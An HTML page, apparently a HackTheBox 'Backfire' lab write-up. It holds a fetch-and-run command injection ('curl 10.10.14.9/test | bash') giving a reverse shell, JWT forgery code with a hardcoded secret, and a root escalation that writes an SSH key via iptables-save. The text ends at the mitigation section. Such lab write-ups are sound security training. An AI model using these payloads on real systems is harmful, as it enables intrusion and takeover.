@@ -1,0 +1,1227 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Backfire – Technical Report &middot; root@s0lkr:~#</title>
+    <meta name="title" content="Backfire – Technical Report &middot; root@s0lkr:~#">
+  
+
+  
+  
+    <meta name="description" content="Exploitation of Havoc C2 infrastructure through SSRF-to-WebSocket chaining.">
+  
+  
+    <meta name="keywords" content="linux,havoc,ssrf,hard,c2,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/2025-07-03-hackthebox-backfire/">
+  
+
+  
+  
+    <meta name="author" content="s0lkr">
+  
+  
+    
+      
+        
+          <link href="https://github.com/s0lkr" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/matheushfarias/" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://x.com/s0lkr" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://medium.com/@s0lkr" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/posts/2025-07-03-hackthebox-backfire/">
+  <meta property="og:site_name" content="root@s0lkr:~#">
+  <meta property="og:title" content="Backfire – Technical Report">
+  <meta property="og:description" content="Exploitation of Havoc C2 infrastructure through SSRF-to-WebSocket chaining.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-05-28T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Havoc">
+    <meta property="article:tag" content="Ssrf">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="C2">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Backfire – Technical Report">
+  <meta name="twitter:description" content="Exploitation of Havoc C2 infrastructure through SSRF-to-WebSocket chaining.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.aa3e91cb076163ffbf42968522935dbf104ce1b76c497e3939e1e00619003122844597b22cb827fef0a2976400bc1cc161110b8e4b65fdc4f1a39a5ffeb06321.css"
+    integrity="sha512-qj6RywdhY/&#43;/QpaFIpNdvxBM4bdsSX45OeHgBhkAMSKERZeyLLgn/vCil2QAvBzBYRELjktl/cTxo5pf/rBjIQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bf2f1d313c33e330808a293b8c19ce8c6d122eb67081e08dba03cf42a35341eba1e8fa9cdc13f5a08df92ef9bc8db08d1e9e04e0c8637787bc4d1208a2e4b948.js"
+      integrity="sha512-vy8dMTwz4zCAiik7jBnOjG0SLrZwgeCNugPPQqNTQeuh6Pqc3BP1oI35Lvm8jbCNHp4E4Mhjd4e8TRIIouS5SA=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Backfire – Technical Report",
+    "headline": "Backfire – Technical Report",
+    "description": "Exploitation of Havoc C2 infrastructure through SSRF-to-WebSocket chaining.",
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/posts/2025-07-03-hackthebox-backfire/",
+    "author" : {
+      "@type": "Person",
+      "name": "s0lkr"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-05-28T00:00:00\u002b00:00",
+    "datePublished": "2025-05-28T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-05-28T00:00:00\u002b00:00",
+    
+    "keywords": ["linux","havoc","ssrf","hard","c2"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "436"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      root@s0lkr:~#
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+  
+    
+      
+    
+  
+
+
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+  
+  
+  
+  <div class="overflow-hidden h-36 md:h-56 lg:h-72">
+    <img
+      src="/aa0a93908243c51fe21e691fc6571911_3951235068450901370_hu_121a6699cdf340be.png"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="w-full h-full nozoom object-cover"
+      >
+  </div>
+
+
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Backfire – Technical Report
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-05-28T00:00:00&#43;00:00">28 May 2025</time><span class="px-2 text-primary-500">&middot;</span><span>436 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
+  
+  
+    
+    
+      
+      
+        
+        
+      
+      
+    
+  
+  <span
+    id="views_posts\2025-07-03-hackthebox-backfire.md"
+    class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400"
+    title="views"
+    >loading</span
+  >
+  <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/hackthebox/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    HackTheBox
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/linux/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/havoc/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Havoc
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/ssrf/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ssrf
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/hard/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hard
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/c2/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    C2
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-identification">1. Identification</a></li>
+    <li><a href="#2-objective">2. Objective</a></li>
+    <li><a href="#3-methodology">3. Methodology</a></li>
+    <li><a href="#4-information-gathering">4. Information Gathering</a></li>
+    <li><a href="#5-vulnerability-analysis">5. Vulnerability Analysis</a>
+      <ul>
+        <li><a href="#51-havoc-c2-exposures">5.1 Havoc C2 Exposures</a></li>
+        <li><a href="#52-hardhat-c2-weaknesses">5.2 HardHat C2 Weaknesses</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-exploitation-chain">6. Exploitation Chain</a>
+      <ul>
+        <li><a href="#61-initial-foothold-ssrf--websocket-rce">6.1 Initial Foothold (SSRF → WebSocket RCE)</a></li>
+        <li><a href="#62-lateral-movement-hardhat-c2">6.2 Lateral Movement (HardHat C2)</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-privilege-escalation">7. Privilege Escalation</a></li>
+    <li><a href="#8-forensic-artifacts">8. Forensic Artifacts</a></li>
+    <li><a href="#9-mitigation-strategies">9. Mitigation Strategies</a></li>
+    <li><a href="#10-technical-insights">10. Technical Insights</a></li>
+    <li><a href="#11-indicators-of-compromise">11. Indicators of Compromise</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-identification">1. Identification</a></li>
+    <li><a href="#2-objective">2. Objective</a></li>
+    <li><a href="#3-methodology">3. Methodology</a></li>
+    <li><a href="#4-information-gathering">4. Information Gathering</a></li>
+    <li><a href="#5-vulnerability-analysis">5. Vulnerability Analysis</a>
+      <ul>
+        <li><a href="#51-havoc-c2-exposures">5.1 Havoc C2 Exposures</a></li>
+        <li><a href="#52-hardhat-c2-weaknesses">5.2 HardHat C2 Weaknesses</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-exploitation-chain">6. Exploitation Chain</a>
+      <ul>
+        <li><a href="#61-initial-foothold-ssrf--websocket-rce">6.1 Initial Foothold (SSRF → WebSocket RCE)</a></li>
+        <li><a href="#62-lateral-movement-hardhat-c2">6.2 Lateral Movement (HardHat C2)</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-privilege-escalation">7. Privilege Escalation</a></li>
+    <li><a href="#8-forensic-artifacts">8. Forensic Artifacts</a></li>
+    <li><a href="#9-mitigation-strategies">9. Mitigation Strategies</a></li>
+    <li><a href="#10-technical-insights">10. Technical Insights</a></li>
+    <li><a href="#11-indicators-of-compromise">11. Indicators of Compromise</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h1 class="relative group">🗞 [Backfire] – Technical Report
+    <div id="-backfire--technical-report" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#-backfire--technical-report" aria-label="Anchor">#</a>
+    </span>
+    
+</h1>
+
+<h2 class="relative group">1. Identification
+    <div id="1-identification" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-identification" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<ul>
+<li><strong>Machine Name</strong>: Backfire</li>
+<li><strong>Operating System</strong>: Linux (Debian)</li>
+<li><strong>IP Address</strong>: 10.10.11.49</li>
+<li><strong>Analysis Date</strong>: May 28, 2025</li>
+<li><strong>Difficulty</strong>: Medium</li>
+</ul>
+<hr>
+
+<h2 class="relative group">2. Objective
+    <div id="2-objective" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#2-objective" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<blockquote><p>Demonstrate exploitation of exposed Havoc C2 infrastructure through SSRF-to-WebSocket chaining, lateral movement to HardHat C2 via JWT weaknesses, and privilege escalation through iptables misconfiguration.</p>
+</blockquote><hr>
+
+<h2 class="relative group">3. Methodology
+    <div id="3-methodology" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#3-methodology" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<ul>
+<li><strong>Information Gathering</strong>:
+<ul>
+<li>Network service enumeration</li>
+<li>Web application analysis</li>
+</ul>
+</li>
+<li><strong>Initial Compromise</strong>:
+<ul>
+<li>SSRF exploitation leading to WebSocket API abuse</li>
+<li>Havoc teamserver RCE via payload compilation injection</li>
+</ul>
+</li>
+<li><strong>Lateral Movement</strong>:
+<ul>
+<li>HardHat C2 JWT token forgery</li>
+<li>Operator account creation</li>
+</ul>
+</li>
+<li><strong>Privilege Escalation</strong>:
+<ul>
+<li>Arbitrary file write via iptables-save</li>
+</ul>
+</li>
+</ul>
+<hr>
+
+<h2 class="relative group">4. Information Gathering
+    <div id="4-information-gathering" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#4-information-gathering" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><strong>Nmap Scan Results</strong>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.11.49</span></span></code></pre></div></div>
+<p><strong>Critical Services</strong>:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Port</th>
+          <th>Service</th>
+          <th>Version</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>22</td>
+          <td>SSH</td>
+          <td>OpenSSH 9.2p1 Debian 2+deb12u4</td>
+      </tr>
+      <tr>
+          <td>443</td>
+          <td>HTTPS</td>
+          <td>nginx 1.22.1</td>
+      </tr>
+      <tr>
+          <td>8000</td>
+          <td>HTTP</td>
+          <td>nginx 1.22.1 (Directory Listing)</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Key Findings</strong>:</p>
+<ul>
+<li>
+<p>TCP/8000 exposes sensitive files:</p>
+<ul>
+<li><code>disable_tls.patch</code>: Disables TLS for Havoc WebSocket (40056/tcp)</li>
+<li><code>havoc.yaotl</code>: Leaks operator credentials and listener configs</li>
+</ul>
+</li>
+</ul>
+<hr>
+
+<h2 class="relative group">5. Vulnerability Analysis
+    <div id="5-vulnerability-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#5-vulnerability-analysis" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">5.1 Havoc C2 Exposures
+    <div id="51-havoc-c2-exposures" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#51-havoc-c2-exposures" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<ul>
+<li><strong>CVE-2025-XXXX</strong>: Unauthenticated SSRF in Havoc API</li>
+<li><strong>Impact</strong>: Internal service probing → WebSocket hijacking</li>
+</ul>
+
+<h3 class="relative group">5.2 HardHat C2 Weaknesses
+    <div id="52-hardhat-c2-weaknesses" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#52-hardhat-c2-weaknesses" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<ul>
+<li><strong>Hardcoded JWT Secret</strong>: <code>jtee43gt-6543-2iur-9422-83r5w27hgzaq</code></li>
+<li><strong>Privilege Escalation Vector</strong>: iptables-save arbitrary write</li>
+</ul>
+<hr>
+
+<h2 class="relative group">6. Exploitation Chain
+    <div id="6-exploitation-chain" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#6-exploitation-chain" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">6.1 Initial Foothold (SSRF → WebSocket RCE)
+    <div id="61-initial-foothold-ssrf--websocket-rce" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#61-initial-foothold-ssrf--websocket-rce" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><strong>WebSocket Handshake Injection</strong>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> b<span class="s2">&#34;GET /havoc/ HTTP/1.1\r\nHost: 127.0.0.1:40056\r\nUpgrade: websocket\r\n...&#34;</span>
+</span></span><span class="line"><span class="cl">write_socket<span class="o">(</span>socket_id, payload<span class="o">)</span></span></span></code></pre></div></div>
+<p><strong>Payload Compilation Attack</strong>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">send_websocket_frame<span class="o">(</span>b<span class="s1">&#39;{&#34;Body&#34;:{&#34;Config&#34;:&#34;\\&#34;Service Name\\&#34;:\\&#34; -mbla; curl 10.10.14.9/test | bash #\\&#34;&#34;...}&#39;</span><span class="o">)</span></span></span></code></pre></div></div>
+<p><strong>Result</strong>: Reverse shell as <code>i1ya</code> user</p>
+
+<h3 class="relative group">6.2 Lateral Movement (HardHat C2)
+    <div id="62-lateral-movement-hardhat-c2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#62-lateral-movement-hardhat-c2" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><strong>JWT Token Generation</strong>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">token</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JwtSecurityToken</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">issuer</span><span class="p">:</span> <span class="s">&#34;hardhatc2.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">claims</span><span class="p">:</span> <span class="k">new</span><span class="p">[]</span> <span class="p">{</span> <span class="k">new</span> <span class="n">Claim</span><span class="p">(</span><span class="n">ClaimTypes</span><span class="p">.</span><span class="n">Role</span><span class="p">,</span> <span class="s">&#34;Administrator&#34;</span><span class="p">)</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="n">signingCredentials</span><span class="p">:</span> <span class="k">new</span> <span class="n">SigningCredentials</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;jtee43gt-...&#34;</span><span class="p">)),</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">SecurityAlgorithms</span><span class="p">.</span><span class="n">HmacSha256</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></div></div>
+<p><strong>Operator Account Creation</strong>:</p>
+<ul>
+<li>Added via <code>/Settings</code> endpoint with full privileges</li>
+</ul>
+<hr>
+
+<h2 class="relative group">7. Privilege Escalation
+    <div id="7-privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#7-privilege-escalation" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><strong>iptables-save Arbitrary Write</strong>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -A INPUT -j ACCEPT -m comment --comment <span class="s1">$&#39;\nssh-ed25519 AAAAC3...\n&#39;</span>
+</span></span><span class="line"><span class="cl">sudo iptables-save -f /root/.ssh/authorized_keys</span></span></code></pre></div></div>
+<p><strong>Root Access Validation</strong>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@backfire.htb 
+</span></span><span class="line"><span class="cl"><span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre></div></div>
+<hr>
+
+<h2 class="relative group">8. Forensic Artifacts
+    <div id="8-forensic-artifacts" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#8-forensic-artifacts" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Location</th>
+          <th>Content</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>/home/i1ya/hardhat.txt</code></td>
+          <td>HardHatC2 installation note</td>
+      </tr>
+      <tr>
+          <td><code>/etc/havoc/teamserver.conf</code></td>
+          <td>Cleartext operator credentials</td>
+      </tr>
+      <tr>
+          <td><code>/var/log/hardhat/access.log</code></td>
+          <td>JWT token usage trails</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+
+<h2 class="relative group">9. Mitigation Strategies
+    <div id="9-mitigation-strategies" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#9-mitigation-strategies" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<ol>
+<li><strong>Havoc C2 Hardening</strong>:
+<ul>
